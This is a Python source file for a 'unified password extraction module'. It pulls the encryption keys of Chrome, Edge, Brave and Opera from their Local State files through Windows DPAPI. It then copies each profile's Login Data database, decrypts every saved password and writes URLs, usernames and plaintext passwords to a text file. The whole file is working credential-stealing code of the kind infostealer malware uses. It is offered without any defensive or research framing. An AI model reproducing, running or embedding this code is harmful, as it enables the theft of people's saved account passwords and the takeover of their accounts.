"""
Unified Password Extraction Module
Combines logic from all analyzed password extraction projects
"""

import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from pathlib import Path
import logging

class PasswordExtractor:
    def __init__(self):
        self.browsers = {
            'chrome': {
                'name': 'Google Chrome',
                'data_path': r'AppData\Local\Google\Chrome\User Data',
                'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
                'process_name': 'chrome.exe',
                'key_name': 'Google Chromekey1'
            },
            'edge': {
                'name': 'Microsoft Edge',
                'data_path': r'AppData\Local\Microsoft\Edge\User Data',
                'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
                'process_name': 'msedge.exe',
                'key_name': 'Microsoft Edgekey1'
            },
            'brave': {
                'name': 'Brave',
                'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
                'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
                'process_name': 'brave.exe',
                'key_name': 'Brave Softwarekey1'
            },
            'opera': {
                'name': 'Opera',
                'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
                'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
                'process_name': 'opera.exe',
                'key_name': 'Opera Softwarekey1'
            }
        }
        
    def get_chrome_datetime(self, chromedate):
        """Convert Chrome timestamp to readable datetime"""
        if chromedate == 86400000000 or not chromedate:
            return "Never"
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    
    def get_encryption_key(self, browser_config):
        """Extract encryption key from browser's Local State file"""
        try:
            user_profile = os.environ['USERPROFILE']
            local_state_path = os.path.join(user_profile, browser_config['local_state'])
            
            if not os.path.exists(local_state_path):
                return None
                
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            # Handle different encryption key formats
            if "os_crypt" in local_state:
                if "encrypted_key" in local_state["os_crypt"]:
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                elif "app_bound_encrypted_key" in local_state["os_crypt"]:
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
                    encrypted_key = encrypted_key[4:]  # Remove prefix
                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            return None
        except Exception as e:
            logging.error(f"Error getting encryption key for {browser_config['name']}: {e}")
            return None
    
    def decrypt_password(self, encrypted_password, key):
        """Decrypt password using AES-GCM"""
        try:
            if not encrypted_password or len(encrypted_password) < 15:
                return None
                
            # Handle v10 format
            if encrypted_password[:3] == b'v10':
                encrypted_password = encrypted_password[3:]
            
            # Handle v20 format
            if encrypted_password[:3] == b'v20':
                iv = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            
            # Legacy format
            iv = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
            
        except Exception as e:
            try:
                # Fallback to DPAPI
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
            except:
                return None
    
    def extract_passwords_from_profile(self, profile_path, browser_name, key):
        """Extract passwords from a specific browser profile"""
        passwords = []
        login_db_path = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db_path):
            logging.warning(f"Login Data not found in {profile_path}")
            return passwords
        
        # Copy database to avoid locks
        temp_db_path = os.path.join(os.environ['TEMP'], f"{browser_name}_login_data.db")
        try:
            shutil.copy2(login_db_path, temp_db_path)
            
            with sqlite3.connect(temp_db_path) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT origin_url, action_url, username_value, password_value, 
                           date_created, date_last_used 
                    FROM logins 
                    ORDER BY date_created
                """)
                
                for row in cursor.fetchall():
                    origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
                    
                    if username and encrypted_password:
                        decrypted_password = self.decrypt_password(encrypted_password, key)
                        if decrypted_password:
                            passwords.append({
                                'origin_url': origin_url,
                                'action_url': action_url,
                                'username': username,
                                'password': decrypted_password,
                                'date_created': self.get_chrome_datetime(date_created),
                                'date_last_used': self.get_chrome_datetime(date_last_used),
                                'browser': browser_name
                            })
        except Exception as e:
            logging.error(f"Error extracting passwords from {profile_path}: {e}")
        finally:
            if os.path.exists(temp_db_path):
                try:
                    os.remove(temp_db_path)
                except:
                    pass
        
        return passwords
    
    def extract_all_passwords(self):
        """Extract passwords from all supported browsers"""
        all_passwords = []
        
        for browser_name, browser_config in self.browsers.items():
            try:
                user_profile = os.environ['USERPROFILE']
                browser_data_path = Path(user_profile) / browser_config['data_path']
                
                if not browser_data_path.exists():
                    continue
                
                key = self.get_encryption_key(browser_config)
                if not key:
                    continue
                
                # Find all profiles - more comprehensive detection
                profiles = []
                for item in browser_data_path.iterdir():
                    if item.is_dir():
                        # Check for Default profile
                        if item.name == "Default":
                            profiles.append(item)
                        # Check for numbered profiles (Profile 1, Profile 2, etc.)
                        elif item.name.startswith("Profile "):
                            profiles.append(item)
                        # Check for unnumbered profiles (Profile1, Profile2, etc.)
                        elif item.name.startswith("Profile") and item.name[7:].isdigit():
                            profiles.append(item)
                
                logging.info(f"Found {len(profiles)} profiles for {browser_name}: {[p.name for p in profiles]}")
                
                if not profiles:
                    continue
                
                for profile in profiles:
                    logging.info(f"Extracting passwords from {browser_name} profile: {profile.name}")
                    passwords = self.extract_passwords_from_profile(profile, browser_name, key)
                    logging.info(f"Found {len(passwords)} passwords in {profile.name}")
                    all_passwords.extend(passwords)
                    
            except Exception as e:
                logging.error(f"Error processing {browser_name}: {e}")
        
        return all_passwords
    
    def save_passwords_to_file(self, passwords, output_file="extracted_passwords.txt"):
        """Save passwords to text file"""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("EXTRACTED BROWSER PASSWORDS\n")
                f.write("=" * 80 + "\n")
                f.write(f"Extraction Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Passwords Found: {len(passwords)}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, pwd in enumerate(passwords, 1):
                    f.write(f"Entry #{i}\n")
                    f.write(f"Browser: {pwd['browser'].upper()}\n")
                    f.write(f"Origin URL: {pwd['origin_url']}\n")
                    f.write(f"Action URL: {pwd['action_url']}\n")
                    f.write(f"Username: {pwd['username']}\n")
                    f.write(f"Password: {pwd['password']}\n")
                    f.write(f"Created: {pwd['date_created']}\n")
                    f.write(f"Last Used: {pwd['date_last_used']}\n")
                    f.write("-" * 50 + "\n\n")
            
            return True
        except Exception as e:
            logging.error(f"Error saving passwords to file: {e}")
            return False
